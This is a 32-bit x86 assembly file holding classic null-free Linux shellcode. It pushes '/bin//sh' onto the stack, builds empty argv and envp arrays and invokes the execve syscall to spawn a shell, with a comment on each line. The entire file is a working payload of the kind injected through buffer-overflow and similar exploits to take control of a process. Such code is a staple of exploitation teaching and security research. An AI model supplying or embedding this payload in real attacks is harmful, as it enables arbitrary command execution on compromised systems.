BITS 32	
	xor 	edx, edx
	xor 	esi, esi
	xor 	edi, edi
	xor		eax, eax
	xor 	ecx, ecx
	mov 	BYTE al, 11 ; execve syscall #11
	push 	edx ; push some nulls for string termination.
	push 	0x68732f2f ; push "//sh" to the stack.
	push 	0x6e69622f ; push "/bin" to the stack.
	mov 	ebx, esp ; Put the address of "/bin//sh" into ebx via esp.
	push 	ecx ; push 32-bit null terminator to stack.
	mov 	edx, esp ; This is an empty array for envp.
	push 	ebx ; push string addr to stack above null terminator.
	mov 	ecx, esp ; This is the argv array with string ptr.
	int     0x80